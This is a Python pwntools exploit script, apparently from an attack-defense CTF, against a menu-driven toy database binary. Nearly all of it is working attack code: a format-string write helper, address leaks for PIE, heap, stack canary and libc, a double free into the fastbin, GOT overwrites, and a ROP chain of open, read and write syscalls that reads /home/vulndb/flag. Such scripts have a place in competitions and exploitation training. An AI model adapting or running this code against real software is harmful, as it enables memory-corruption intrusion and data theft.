#! /usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def fmt(prev, value, idx, byte=1):
	ln  = "%{}c%{}$ln"
	n   = "%{}c%{}$n"
	hn  = "%{}c%{}$hn"
	hhn = "%{}c%{}$hhn"

	op = {1:hhn, 2:hn, 4:n, 8:ln}
	offset = {1: 0x100, 2: 0x10000, 4:0x100000000, 8:0x10000000000000000}
	if value > prev:
		return op[byte].format(value-prev, idx)
	elif value == prev:
		if byte==1:
			return "%{}$hhn".format(idx)
		elif byte == 2:
			return "%{}$hn".format(idx)
		elif byte == 4:
			return "%{}$n".format(idx)
		elif byte == 8:
			return "%{}$ln".format(idx)
	else:
		return op[byte].format(value-prev+offset[byte], idx)


def create_db(name):
    r.sendlineafter('>>', 'Create db')
    r.sendafter('name:', name)
    print(r.recvline())

def delete_db(idx):
    r.sendlineafter('>>', 'Delete db')
    r.sendlineafter('id:', str(idx))

def select_db(idx):
    r.sendlineafter('>>', 'Select db')
    r.sendlineafter('id:', str(idx))

# TODO more = 'yes'
def create_table(tb_name, col_name, col_type, more='no'):
    r.sendlineafter('>>', 'Create table')
    r.sendafter('Table name:', tb_name)
    r.sendafter('Column name:', col_name)
    r.sendlineafter(':', str(col_type))
    r.sendlineafter('?', more)

def Drop_table(name):
    r.sendlineafter('>>', 'Drop table')
    r.sendlineafter('name:', name)
    print(r.recvline())

def insert(tb_name, data=''):
    r.sendlineafter('>>', 'Insert')
    r.sendafter('name:', tb_name)
    query = r.recvuntil(':', timeout=1).decode()
    if(query[1] == '[' and query[-1] == ':'):
        print(query)
        r.sendline(data)

def select_all(tb_name):
    r.sendlineafter('>>', 'Select all')
    r.sendlineafter('name:', tb_name)

def select(tb_name, row_id):
    r.sendlineafter('>>', 'Select')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    print(r.recvuntil('[')[:-1])

def delete(tb_name, row_id):
    r.sendlineafter('>>', 'Delete')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))

def update(tb_name, row_id, data):
    r.sendlineafter('>>', 'Update')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    r.sendafter(':', str(data))

def develop_mode(token='', data=''):
    r.sendlineafter('>>', 'developer mode')
    r.sendafter(':', token)
    if len(data):
        print(r.recvline())
        r.sendline(data)

def disconnect():
    r.sendlineafter('>>', 'Disconnect')
    print(r.recvline())

binary = '106-round-137-team-4-ad-2-55b82bc770c73925a6397e4117bc81f0'

r = process(binary, env={"LD_LIBRARY_PATH":"."})
#input('>')
r.sendafter('>>', 'a'*0x7+'x')
r.recvuntil('x')
pie_base = u64(r.recvline().strip()+b'\x00'*2) - 0x1360
print("pie_base @ ", hex(pie_base))

#r.sendafter('>>', 'a'*0xf+'x')
#r.recvuntil('x')
#stack = u64(r.recvline().strip()+b'\x00'*2)
#print("stack @ ", hex(stack))

# leak heap

create_db('db0')
create_db('db1')
delete_db(0)
delete_db(1)
select_db(1)
r.recvuntil(b'[db:')
heap_base = u64(r.recvuntil(b']', drop=True).ljust(8, b'\0')) - 0x2a0
log.info('heap: {:#x}'.format(heap_base))


create_db('db2')
create_db('db3')
create_db('db4')

r.sendlineafter('>>', "Help") # obfuscation


select_db(2)
create_table('/home/vulndb/flag', 'c'*0xf, 3)
for i in range(7):
    insert('/home/vulndb/flag', '123')

for i in range(7):
    delete('/home/vulndb/flag', 0)

# double free to fasbin
delete_db(3)
delete_db(4)
delete_db(3)

insert('/home/vulndb/flag', '%15$p%17$p')
insert('/home/vulndb/flag', '123')
insert('/home/vulndb/flag', '123')

sleep_got = pie_base + 0x60d8
free_got = pie_base + 0x6018
puts_got = pie_base + 0x6048
printf_plt = pie_base + 0x1260
strncmp_got = pie_base + 0x6028
gets_plt = pie_base + 0x1110
strcmp_got = pie_base + 0x6080

insert('/home/vulndb/flag', p64(free_got-0x8))

flagstr = heap_base + 768
xor_pat = 0x5a5a5a5a5a5a5a5a
xor_flagstr = xor_pat ^ flagstr

target = heap_base + 0x1b30
insert('/home/vulndb/flag', 'a')
create_db(b'a'*8 + p64(printf_plt))

payload = '%15$p%17$p'
delete('/home/vulndb/flag', 0)

r.recvuntil('0x')
canary = int(b'0x'+r.recvn(14)+b'00', 16)
print("canary = ", hex(canary))
r.recvuntil('0x7f')
libc_base = int(b'0x7f'+r.recvn(10), 16) - 0x270b3
print("libc_base @ ", hex(libc_base))

pop_rax = 0x000000000004a550 + libc_base
pop_rdi = 0x0000000000026b72 + libc_base
pop_rsi = 0x0000000000027529 + libc_base
pop_rdx_r12 = 0x000000000011c371 + libc_base
syscall = 0x46559  + libc_base
magic = 0x00000000000915e6 + libc_base
leave=  libc_base + 0x000000000005aa48
gets = libc_base + 0x86af0
print("gets @ ", hex(gets))

target = gets
payload = fmt(0, (target>>16)&0xff, 14,1)
payload += fmt((target>>16)&0xff, target&0xffff, 13,2)
insert('/home/vulndb/flag', payload)

r.sendlineafter('>>', b'a'*0x8 + flat(strcmp_got, strcmp_got+2))
#gdb.attach(r, 'b *$_pie()+0x2a5a')
delete('/home/vulndb/flag', 4)

payload = b'a'*0x27 + flat(canary, 0, pop_rdi, heap_base + 0x300, pop_rsi, 0, pop_rdx_r12, 0, 0, pop_rax, 2, syscall\
        , pop_rdi, 3, pop_rsi, heap_base+0x400, pop_rdx_r12, 0x30, 0, pop_rax, 0, syscall\
        , pop_rdi, 1, pop_rsi, heap_base+0x400, pop_rdx_r12, 0x30, 0, pop_rax, 1, syscall)

select_db(0)
create_table('a\n', 'b\n', 3, payload) 


r.interactive()











